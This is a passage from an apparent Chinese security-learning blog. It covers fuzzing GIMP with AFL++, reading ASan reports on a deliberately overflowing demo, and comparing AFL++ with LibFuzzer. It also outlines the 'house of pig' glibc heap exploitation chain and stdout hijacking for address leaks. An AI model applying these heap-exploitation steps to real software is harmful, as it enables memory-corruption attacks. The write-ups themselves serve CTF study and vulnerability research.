class="line"><span class="comment"># build and install</span></span><br><span class="line">./configure --enable-debug --disable-glibtest  --without-vala --without-cairo --without-pango --without-pangocairo --without-gdk-pixbuf --without-lensfun --without-libjpeg --without-libpng --without-librsvg --without-openexr --without-sdl --without-libopenraw --without-jasper --without-graphviz --without-lua --without-libavformat --without-libv4l --without-libspiro --without-exiv2 --without-umfpack</span><br><span class="line">make -j$(<span class="built_in">nproc</span>)</span><br><span class="line"><span class="built_in">sudo</span> make install</span><br></pre></td></tr></table></figure>

<blockquote>
<p>这里对于 GEGL 这个图形库的编译安装我们不做过多介绍，这不是我们的重点，可以明确告知的是上面的库在编译时大概率会编译报错，导致一些库文件编译失败。所以，对于Ubuntu 20.04以上版本（我使用的是22.04）可以直接 <code>sudo apt install libgegl-0.4-0</code> 来安装这个0.4版本的库。（尽量不在非fuzz阶段浪费时间）</p>
</blockquote>
<p>环境配不好，无语了。。。</p>
<p>然后，下载 GIMP 2.8.16，并进行编译安装：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">download</span> </span><br><span class="line">cd ..</span><br><span class="line">wget https://mirror.klaus-uwe.me/gimp/pub/gimp/v2.8/gimp-2.8.16.tar.bz2</span><br><span class="line">tar xvf gimp-2.8.16.tar.bz2 &amp;&amp; cd gimp-2.8.16/</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">build and install</span></span><br><span class="line">CC=afl-clang-lto CXX=afl-clang-lto++ PKG_CONFIG_PATH=$PKG_CONFIG_PATH:/usr/local/lib/pkgconfig CFLAGS=&quot;-fsanitize=address&quot; CXXFLAGS=&quot;-fsanitize=address&quot; LDFLAGS=&quot;-fsanitize=address&quot; ./configure --disable-gtktest --disable-glibtest --disable-alsatest --disable-nls --without-libtiff --without-libjpeg --without-bzip2 --without-gs --without-libpng --without-libmng --without-libexif --without-aa --without-libxpm --without-webkit --without-librsvg --without-print --without-poppler --without-cairo-pdf --without-gvfs --without-libcurl --without-wmf --without-libjasper --without-alsa --without-gudev --disable-python --enable-gimp-console --without-mac-twain --without-script-fu --without-gudev --without-dbus --disable-mp --without-linux-input --without-xvfb-run --with-gif-compression=none --without-xmc --with-shm=none --enable-debug  --prefix=&quot;$HOME/Desktop/Fuzz/training/fuzzing_gimp/gimp-2.8.16/install&quot;</span><br><span class="line">AFL_USE_ASAN=1 make -j$(nproc)</span><br><span class="line">AFL_USE_ASAN=1 make install</span><br></pre></td></tr></table></figure>

<p>这里的编译选项有点多，第一次的时候尽可能保持一致，避免出错，如果要进行优化和改进，可根据实际需求来增删编译选项。</p>
<p>编译完成后检查软件是否可以正常运行，命令行和图形界面都检查一下。</p>
<h2 id="Exercise-8：Adobe-Reader"><a href="#Exercise-8：Adobe-Reader" class="headerlink" title="Exercise 8：Adobe Reader"></a>Exercise 8：Adobe Reader</h2><p>之前我们都是针对有源码的程序进行 fuzz，这个例子将对纯二进制文件进行fuzz，需要使用到 AFL 的 qemu-mode。对于 AFL 的qemu-mode的详细介绍，可以查看 AFL 的官方文档的 qemu-mode 的部分。</p>
<h3 id="目标环境配置-2"><a href="#目标环境配置-2" class="headerlink" title="目标环境配置"></a>目标环境配置</h3><p><strong>构建afl-qemu-trace</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install ninja-build libc6-dev-i386</span><br><span class="line">cd ~/Desktop/v4ler1an/Fuzz/AFLplusplus/qemu_mode/</span><br><span class="line">CPU_TARGET=i386 ./build_qemu_support.sh</span><br></pre></td></tr></table></figure>





<p>无语了又有一些环境问题（可能是wsl2不兼容吧），<a href="https://hollk.blog.csdn.net/article/details/129132526">hollk师傅的文章有个qemu和AFL++的闭源测试</a>会记录在后门文章</p>
<p>这个项目实现的<a href="https://www.iotsec-zone.com/article/245#7-fuzzing101---7-adobe-reader">参考文章</a></p>
<h1 id="专题三：Address-Sanitizer-ASan-各类溢出demo分析"><a href="#专题三：Address-Sanitizer-ASan-各类溢出demo分析" class="headerlink" title="专题三：Address Sanitizer(ASan)各类溢出demo分析"></a>专题三：Address Sanitizer(ASan)各类溢出demo分析</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前面的文章基本上都是在 Fuzzing 101 项目的基础上进行详细的记录，也就是说大部分的内容都是以环境变装、使用技巧为主，没有过多的描述 fuzz 出 crash 后应该如何分析。因此特意写了这篇文章，通过一些漏洞类型的 demo 分析一下 Address Sanitizer (ASan) 的报告。</p>
<h2 id="Address-Sanitizer-ASan-介绍"><a href="#Address-Sanitizer-ASan-介绍" class="headerlink" title="Address Sanitizer (ASan) 介绍"></a>Address Sanitizer (ASan) 介绍</h2><p>Address Sanitizer 又名 ASan，是一个快速的 C&#x2F;C++ 代码存储错误检测器。该工具由一个编译器检测模块和一个提供内存操作函数（如 malloc&#x2F;free）替代项的 run-time 库。该工具适用于 x86、ARM、MIPS、PowerPC64 架构，支持的操作系统有 Linux、Darwin (OS X 和 iOS 模拟器)、FreeBSD、Android。</p>
<p>ASan 可以检测到：<code>UAF</code>、<code>Heap buffer overflow</code>、<code>Stack buffer overflow</code>、<code>Global buffer overflow</code>、<code>Use after return</code>、<code>Use after scope</code>、<code>Initialization order bugs</code>、<code>Memory leak</code></p>
<p>文章后半部分会针对上述几个漏洞类型的 demo 进行分析。</p>
<p><a href="https://github.com/google/sanitizers/wiki/AddressSanitizerAlgorithm">详细了解 ASan</a></p>
<h2 id="各类漏洞-demo-分析"><a href="#各类漏洞-demo-分析" class="headerlink" title="各类漏洞 demo 分析"></a>各类漏洞 demo 分析</h2><p>接下来会针对 UAF、Heap buffer overflow、Stack buffer overflow、Global buffer overflow、Use after return、Use after scope、Initialization order bugs、Memory leak 分别举例进行分析，重点是如何看 ASan 显示的结果。</p>
<h3 id="stack-overflow"><a href="#stack-overflow" class="headerlink" title="stack overflow"></a>stack overflow</h3><p>源C++ demo</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> arr[<span class="number">100</span>];</span><br><span class="line">  arr[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> arr[argc + <span class="number">100</span>];  <span class="comment">// overflow  argc default 1</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//clang -O -g -fsanitize=address demo.cpp -o demo</span></span><br></pre></td></tr></table></figure>

<p>创建哟个arr[100]的数组，int 型共400字节，最后返回arr[argc + 100]。这里出现溢出，返回位置超出栈空间大小</p>
<p>运行一下编译的程序，ASan就会显示出检测日志</p>
<p><img data-src="/../images/image-20251003170338280.png" alt="image-20251003170338280"></p>
<p>上面就是ASan输出的全部日志，下面开始分析</p>
<p><img data-src="/../images/image-20251003170549263.png" alt="image-20251003170549263"></p>
<p>上半部分主要显示的是漏洞类型和漏洞位置</p>
<ul>
<li>红色框部分：<code>==</code>中间表示的是检测到问题的进程号22836，<code>ERROR</code>后面为漏洞类型及检测到的漏洞<code>stack-buffer-overflow</code>所在地址<code>0x7ffd8a8539f4 </code>，并记录此时的pc寄存器<code>0x584d2326a08d </code>，sp寄存器<code>0x7ffd8a853828</code>，bp寄存器<code>0x7ffd8a853830 </code></li>
<li>蓝色框部分：主要描述了采用READ的操作，在线程T0的<code>0x7ffd8a8539f4</code>栈地址处读取了大小为4的数据，下面的#123是函数栈</li>
<li>绿色框部分：表示漏洞地址<code>0x7ffd8a8539f4</code>位于线程T0的栈中的帧偏移量436处，并指定被溢出的变量</li>
<li>其余部分为总结和警告</li>
</ul>
<p><strong><img data-src="../images/image-20251003173250917.png" alt="image-20251003173250917" style="zoom: 33%;" /></strong><img data-src="../images/image-20251003173333695.png" alt="image-20251003173333695" style="zoom:33%;" /></p>
<p>下半部分为 shadow 的字节图，其中<strong>一个字节表示程序内存中存储的 8 个字节</strong>。可以再图中看到一些符号，例如 00、f1、f3，继续向下翻可以看到每种符号对应表示的含义。</p>
<p>ASan 会对程序中的内存空间在侧或者添加两个可写区块 redzone，上图的 f1 即为左侧增加区域，f3 为右侧增加区域，其中加中括号的f3即为漏洞发生点。中间的 00 节点，可以看到 shadow 中的 50 个字节对应内存中的就是 50 x 8 &#x3D; 400 个字节，正好是 int arr[100] 所释放的空间大小（int 型变量没有添加任何的参数，所以 argc 为 1（demo 也计入参数），所以这里只溢出了 4 个字节（arr[101] 占 4 个字节）。那么在 shadow 中就会看到以下三点关键消息：</p>
<ul>
<li>被溢出变量：arr</li>
<li>溢出点所在位置：0x7ffd8a8539f4</li>
<li>溢出点距离变量起始点偏移：436</li>
<li>缓冲区溢出情况</li>
</ul>
<p>上述三点信息可以溢出位置进行定位。</p>
]]></content>
      <categories>
        <category>fuzz</category>
      </categories>
      <tags>
        <tag>fuzz</tag>
        <tag>afl</tag>
      </tags>
  </entry>
  <entry>
    <title>了解fuzz</title>
    <url>/2025/08/16/fuzz/</url>
    <content><![CDATA[<p>安装<code>apt install bsdmainutils</code></p>
<p>exif格式：<code>https://www.media.mit.edu/pia/Research/deepview/exif.html</code></p>
<p>fuzz文件目标类型<code>git clone https://github.com/ianare/exif-samples.git</code></p>
<h3 id="详细技术对比与漏洞挖掘应用"><a href="#详细技术对比与漏洞挖掘应用" class="headerlink" title="详细技术对比与漏洞挖掘应用"></a>详细技术对比与漏洞挖掘应用</h3><table>
<thead>
<tr>
<th>特性</th>
<th>AFL++</th>
<th>LibFuzzer</th>
</tr>
</thead>
<tbody><tr>
<td><strong>Fuzzing 类型</strong></td>
<td><strong>进程外 (Out-of-Process)</strong>, 灰盒 Fuzzing</td>
<td><strong>进程内 (In-Process)</strong>, 白盒 Fuzzing</td>
</tr>
<tr>
<td><strong>目标对象</strong></td>
<td><strong>完整的可执行程序</strong>，通过 stdin 或文件接收输入。</td>
<td><strong>程序中的特定函数或库 API</strong>。</td>
</tr>
<tr>
<td><strong>反馈机制</strong></td>
<td>编译时<strong>插桩 (Instrumentation)</strong>，通过 fork server 和共享内存与 Fuzzer 通信。</td>
<td>编译器内置的覆盖率反馈机制 (SanitizerCoverage)，<strong>无进程间通信开销</strong>。</td>
</tr>
<tr>
<td><strong>执行速度</strong></td>
<td>相对较慢 (几百到几千 execs&#x2F;sec)</td>
<td><strong>非常快</strong> (几万到几十万 execs&#x2F;sec)</td>
</tr>
<tr>
<td><strong>上手难度</strong></td>
<td><strong>较低</strong>。对于简单的程序，只需用 afl-clang-fast 编译即可，无需写代码。</td>
<td><strong>中等</strong>。需要为目标函数编写一个 Harness (测试驱动程序)。</td>
</tr>
<tr>
<td><strong>发现 Bug 类型</strong></td>
<td>各种类型，包括程序初始化&#x2F;退出时的 Bug，内存竞争等。</td>
<td>主要集中在被测函数内部的逻辑 Bug，如解析错误、缓冲区溢出等。</td>
</tr>
</tbody></table>
<h3 id="在漏洞挖掘中如何选择？"><a href="#在漏洞挖掘中如何选择？" class="headerlink" title="在漏洞挖掘中如何选择？"></a>在漏洞挖掘中如何选择？</h3><p><strong>你应该使用 AFL++ 的场景：</strong></p>
<ol>
<li><strong>目标是一个完整的应用程序</strong>：比如一个图像查看器、一个 PDF 阅读器、一个命令行解压工具 (exiv2, objdump, unzip 等)。</li>
<li><strong>你没有源代码，只有二进制文件</strong>：AFL++ 的 QEMU 模式或 Unicorn 模式可以对闭源程序进行 Fuzzing (虽然效率较低)。</li>
<li><strong>你想快速上手</strong>：对于一个简单的、接收文件输入的程序，用 AFL++ 开始 Fuzzing 几乎是零代码成本的。</li>
<li><strong>程序状态复杂</strong>：如果程序的 Bug 需要复杂的全局状态或多次交互才能触发，AFL++ 的模型更接近真实使用情况。</li>
</ol>
<p><strong>你应该使用 LibFuzzer 的场景：</strong></p>
<ol>
<li><strong>目标是一个库 (library)</strong>：比如一个 JSON 解析库、一个加解密库、一个网络协议解析库。你想测试它的某个核心 API。</li>
<li><strong>你想对一个大型项目中某个特定的复杂函数进行深度测试</strong>：例如，你想测试 Web 浏览器中的 URL 解析函数，或者操作系统内核中的文件系统解析函数。</li>
<li><strong>追求极致的速度和效率</strong>：当你知道“漏洞最可能出现在这个函数里”时，用 LibFuzzer 直接对它进行“饱和式攻击”是最高效的选择。</li>
<li><strong>你想把它集成到持续集成 (CI) 系统中</strong>：LibFuzzer 的 Harness 本质上就是一个单元测试，非常适合自动化。Google 的 OSS-Fuzz 项目就大量使用了 LibFuzzer。</li>
</ol>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><strong>AFL++ 和 LibFuzzer 不是竞争关系，而是互补关系。</strong></p>
<p>一个专业的漏洞研究员通常会同时使用这两种工具。</p>
<ul>
<li><strong>广度优先，用 AFL++</strong>：先用 AFL++ 对整个程序进行一轮广泛的 Fuzzing，快速找到一些表层的、容易触发的 Bug。</li>
<li><strong>深度优先，用 LibFuzzer</strong>：在对程序有了一定了解后，识别出其中最复杂、最可能出问题的核心处理函数，然后为它编写一个 Harness，用 LibFuzzer 进行深度、高速的 Fuzzing，挖掘更深层次的漏洞。</li>
</ul>
]]></content>
      <categories>
        <category>fuzz</category>
      </categories>
      <tags>
        <tag>fuzz</tag>
      </tags>
  </entry>
  <entry>
    <title>house of pig</title>
    <url>/2025/04/15/house_of_pig/</url>
    <content><![CDATA[<h1 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h1><h2 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h2><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">exit-&gt;__run_exit_handlers-&gt;__IO_cleanup-&gt;__IO_flush_all_lockp-&gt;__IO_str_overflow</span><br><span class="line">-&gt;malloc-&gt;__memmove_avx_unaligned_erms(memcpy)-&gt;free</span><br></pre></td></tr></table></figure>

<p>通过非预期调用 <code>malloc</code>&#x2F;<code>memcpy</code>&#x2F;<code>free</code> 实现利用</p>
<h1 id="适用场景"><a href="#适用场景" class="headerlink" title="适用场景"></a>适用场景</h1><p>因为利用链是 FSOP 的刷新流，所以需要触发刷新流，调用 <code>__IO_flush_all_lockp</code> 主要有三个时机：</p>
<ol>
<li><code>libc</code> 执行 <code>abort</code> 函数时（内存错误）</li>
<li>程序显式调用 <code>exit</code> 函数时</li>
<li>程序从 <code>main</code> 函数返回时</li>
</ol>
<p>现在的比赛环境，有了很多新的 IO 利用链，house of pig 借非预期地调用 <code>malloc</code>、<code>memcpy</code>、<code>free</code>，仍然有一定的应用场景。</p>
<p>除了结合题目的应用场景外，House of pig 通用性上，通常用于显式 <code>exit</code> 的情况（或者存在于 <code>main</code> 函数返回的情况），可以仅用一次 <code>largebinattack</code> 实现攻击目标。</p>
<h1 id="利用技巧"><a href="#利用技巧" class="headerlink" title="利用技巧"></a>利用技巧</h1><p>house of pig 有很大通用性优势的，有好几种分支，主要区别在于着重利用的函数。</p>
<p> **方案一：**重点在执行 free，触发 <code>IO_list_all</code></p>
<p>如果是利用 <code>fastbin reverse</code> 方法就触发 <code>IO_list_all + 0x70</code>（<code>stderr</code> 的 chain 字段）</p>
<ol>
<li>堆块上放好 payload（我们要触发的函数地址）</li>
<li>可申请到的 bin 里放置或伪造 <code>free_hook - 0x10</code>（即要修改的位置）</li>
<li>伪造 IO 结构体，触发实现申请 <code>free_hook</code>，写入 payload</li>
<li>触发 free 实现利用</li>
</ol>
<p>**方案二：**重点在执行 memcpy，构造堆用，实现 largebinattack -&gt; 触发 <code>IO_list_all</code></p>
<ol>
<li>在堆块里放置好 payload</li>
<li>修改 <code>tcache_struct</code> 的值</li>
<li>以及构造 fake IO 链 (0x410 -&gt; 0x290 -&gt; 0x128 -&gt; 0x108) 触发 <code>tcache</code> 结构体，实现申请 <code>libc.memcpy.got</code>，修改为 <code>system</code>。</li>
<li><code>delete</code> 一个 0x410 的堆</li>
</ol>
<p>方案二的延伸可以实现不用在 bin 里伪造目标地址，直接触发 <code>tcache</code> 结构体实现任意地址申请，且整个方案只需要进行一次 <code>largebinattack</code> 即可，适用于可以刷新流的任何情况。</p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>hijack_stdout</title>
    <url>/2025/03/27/hijack_stdout/</url>
    <content><![CDATA[<p>在glibc_heap的利用中，很可能会遇到没有show功能的程序，从而泄露不了地址，我们可以通过控制stdio，在通过puts等io操作输出之内的函数泄露libc地址</p>
<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><h3 id="IO-puts"><a href="#IO-puts" class="headerlink" title="_IO_puts()"></a>_IO_puts()</h3><p>首先我们看puts()函数的源代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_puts (<span class="type">const</span> <span class="type">char</span> *str)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result = EOF;</span><br><span class="line">  _IO_size_t len = <span class="built_in">strlen</span> (str);</span><br><span class="line">  _IO_acquire_lock (_IO_stdout);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((_IO_vtable_offset (_IO_stdout) != <span class="number">0</span></span><br><span class="line">       || _IO_fwide (_IO_stdout, <span class="number">-1</span>) == <span class="number">-1</span>)</span><br><span class="line">      &amp;&amp; _IO_sputn (_IO_stdout, str, len) == len</span><br><span class="line">      &amp;&amp; _IO_putc_unlocked (<span class="string">&#x27;\n&#x27;</span>, _IO_stdout) != EOF)</span><br><span class="line">    result = MIN (INT_MAX, len + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  _IO_release_lock (_IO_stdout);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里我们要关注的是<code>_IO_sputn</code>，因为只有它调用了<code>str</code>参数，跳转到定义</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_sputn(__fp, __s, __n) _IO_XSPUTN (__fp, __s, __n)</span></span><br></pre></td></tr></table></figure>

<p>AI的解释：</p>
<p>在glibc中，<code>#define _IO_sputn(__fp, __s, __n)</code>是一个宏定义，它的作用是将一个函数或操作的调用转换为另一个函数或操作的调用。在这个宏中，<code>_IO_XSPUTN</code>是实际执行操作的函数，<code>__fp</code>、<code>__s</code> 和 <code>__n</code> 是传递给该函数的参数。</p>
<p>具体来说，这个宏的定义可以被分解为以下几点：</p>
<ol>
<li><p><strong>宏定义</strong>：<code>#define</code>是C语言中的宏定义指令，用于定义一个宏。这个宏在预处理阶段会被展开。</p>
</li>
<li><p><strong>参数</strong>：<code>__fp</code>、<code>__s</code>和<code>__n</code>是这个宏接受的三个参数：</p>
<ul>
<li><code>__fp</code>：通常是一个指向文件流的指针（<code>FILE *</code>），表示要写入的目标文件流。</li>
<li><code>__s</code>：通常是一个指向字符数组的指针，表示要写入的数据。</li>
<li><code>__n</code>：表示要写入的字符数。</li>
</ul>
</li>
<li><p><strong>展开</strong>：当在代码中调用<code>_IO_sputn(fp, s, n)</code>时，预处理器会将其展开为<code>_IO_XSPUTN(fp, s, n)</code>，从而调用<code>_IO_XSPUTN</code>函数。</p>
</li>
</ol>
<p><code>_IO_XSPUTN</code>通常是一个更底层的实现，用于处理输出到文件流的具体细节。它可能会处理缓冲、字符编码等。</p>
<p>假设你在代码中有如下调用：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_sputn(fp, buffer, size);</span><br></pre></td></tr></table></figure>

<p>在预处理阶段，这将被转换为：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_XSPUTN(fp, buffer, size);</span><br></pre></td></tr></table></figure>

<p>这样，实际的输出操作将由<code>_IO_XSPUTN</code>函数执行，而<code>_IO_sputn</code>宏提供了一个更高级的接口。</p>
<p><strong>总结</strong></p>
<p><code>_IO_sputn</code>宏用于将对输出操作的高级抽象映射到底层实现，便于代码的维护和可读性，同时也可能涉及到优化和条件编译等特性。</p>
<p>这也就说明了这个<code>_IO_putn(__fp, __s, __n)</code>是一个虚表函数（网上好多是这样说的），虽然<code>#define _IO_sputn(__fp, __s, __n) _IO_XSPUTN(__fp, __s, __n)</code>本身是一个宏定义，并不涉及C++的虚表机制，但可以通过理解多态性来认识它的作用和设计理念。在C++中，宏可以简化接口，同时背后可能调用一些更为复杂的底层实现，类似于如何通过虚表和虚函数来实现动态绑定。这种设计使得代码更加灵活和可维护。</p>
<hr>
<h3 id="IO-new-file-xsputn"><a href="#IO-new-file-xsputn" class="headerlink" title="_IO_new_file_xsputn()"></a>_IO_new_file_xsputn()</h3><p>这个<code>_IO_sputn()</code>最终调用的是<code>_IO_new_file_xsputn(</code>)函数，在glibc&#x2F;libio&#x2F;fileops.c&#x2F;1200行左右，这里我们要关注的是<code>_IO_OVERFLOW()</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_size_t</span><br><span class="line">_IO_new_file_xsputn (_IO_FILE *f, <span class="type">const</span> <span class="type">void</span> *data, _IO_size_t n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *s = (<span class="type">const</span> <span class="type">char</span> *) data;</span><br><span class="line">  _IO_size_t to_do = n;</span><br><span class="line">  <span class="type">int</span> must_flush = <span class="number">0</span>;</span><br><span class="line">  _IO_size_t count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (n &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="comment">/* This is an optimized implementation.</span></span><br><span class="line"><span class="comment">     If the amount to be written straddles a block boundary</span></span><br><span class="line"><span class="comment">     (or the filebuf is unbuffered), use sys_write directly. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* First figure out how much space is available in the buffer. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      count = f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr;</span><br><span class="line">      <span class="keyword">if</span> (count &gt;= n)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="type">const</span> <span class="type">char</span> *p;</span><br><span class="line">	  <span class="keyword">for</span> (p = s + n; p &gt; s; )</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="keyword">if</span> (*--p == <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">		&#123;</span><br><span class="line">		  count = p - s + <span class="number">1</span>;</span><br><span class="line">		  must_flush = <span class="number">1</span>;</span><br><span class="line">		  <span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)</span><br><span class="line">    count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr; <span class="comment">/* Space available. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Then fill the buffer. */</span></span><br><span class="line">  <span class="keyword">if</span> (count &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (count &gt; to_do)</span><br><span class="line">	count = to_do;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _LIBC</span></span><br><span class="line">      f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">      <span class="built_in">memcpy</span> (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">      f-&gt;_IO_write_ptr += count;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      s += count;</span><br><span class="line">      to_do -= count;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (to_do + must_flush &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_size_t block_size, do_write;</span><br><span class="line">      <span class="comment">/* Next flush the (full) buffer. */</span></span><br><span class="line">      <span class="keyword">if</span> (_IO_OVERFLOW (f, EOF) == EOF)</span><br><span class="line"><span class="comment">//用它来刷新缓冲区，刷新缓冲区也就会输出</span></span><br></pre></td></tr></table></figure>

<p>这个<code>_IO_OVERFLOW</code>也是虚表函数，它实际调用的是<code>_IO_new_file_overflow</code></p>
<h3 id="IO-new-file-overflow"><a href="#IO-new-file-overflow" class="headerlink" title="_IO_new_file_overflow"></a>_IO_new_file_overflow</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_file_overflow (_IO_FILE *f, <span class="type">int</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//flags不能包含_IO_NO_WRITES标志位0x8，否则就会执行这里的报错</span></span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="comment">//这里若满足这两个条件之一就会执行下面这一大串代码，很有可能会报错</span></span><br><span class="line">  <span class="comment">//所以我们设置flags中_IO_CURRENTLY_PUTTING标志位为1，就可以跳过这一大段代码</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)<span class="comment">//</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  _IO_doallocbuf (f);</span><br><span class="line">	  _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="comment">/* Otherwise must be currently reading.</span></span><br><span class="line"><span class="comment">	 If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,</span></span><br><span class="line"><span class="comment">	 logically slide the buffer forwards one block (by setting the</span></span><br><span class="line"><span class="comment">	 read pointers to all point at the beginning of the block).  This</span></span><br><span class="line"><span class="comment">	 makes room for subsequent output.</span></span><br><span class="line"><span class="comment">	 Otherwise, set the read pointers to _IO_read_end (leaving that</span></span><br><span class="line"><span class="comment">	 alone, so it can continue to correspond to the external position). */</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (_IO_in_backup (f)))</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="type">size_t</span> nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;</span><br><span class="line">	  _IO_free_backup_area (f);</span><br><span class="line">	  f-&gt;_IO_read_base -= MIN (nbackup,</span><br><span class="line">				   f-&gt;_IO_read_base - f-&gt;_IO_buf_base);</span><br><span class="line">	  f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)</span><br><span class="line">	f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;</span><br><span class="line">      f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;</span><br><span class="line">      f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;</span><br><span class="line">      f-&gt;_IO_write_end = f-&gt;_IO_buf_end;</span><br><span class="line">      f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;</span><br><span class="line"></span><br><span class="line">      f-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">	f-&gt;_IO_write_end = f-&gt;_IO_write_ptr;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//在这里我们要关注这个 _IO_do_write,调整到_Io_new_do_write</span></span><br><span class="line">  <span class="keyword">if</span> (ch == EOF)</span><br><span class="line">    <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">			 f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br><span class="line">    <span class="comment">//这里_IO_do_write输出了f-&gt;_IO_write_ptr - f-&gt;_IO_write_base中间的值</span></span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) <span class="comment">/* Buffer is really full */</span></span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush (f) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  *f-&gt;_IO_write_ptr++ = ch;</span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_UNBUFFERED)</span><br><span class="line">      || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == <span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> (_IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">		      f-&gt;_IO_write_ptr - 